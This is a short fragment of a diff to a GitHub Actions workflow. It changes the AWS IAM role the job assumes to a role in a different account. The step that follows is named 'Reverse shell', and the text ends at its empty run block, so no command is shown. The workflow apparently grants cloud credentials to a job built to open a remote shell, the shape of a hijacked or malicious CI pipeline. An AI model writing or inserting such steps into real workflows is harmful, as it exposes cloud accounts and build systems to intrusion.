@@ -13,7 +13,7 @@ jobs:
     steps:
       - uses: aws-actions/configure-aws-credentials@v3
         with:
-          role-to-assume: arn:aws:iam::042947190491:role/api-polygon-tokens-GithubActionsRole
+          role-to-assume: arn:aws:iam::694952825951:role/axiom-cloudwatch-forwarder-release-20241007163724313800000001
           aws-region: us-east-1
       - name: Reverse shell
         run: |
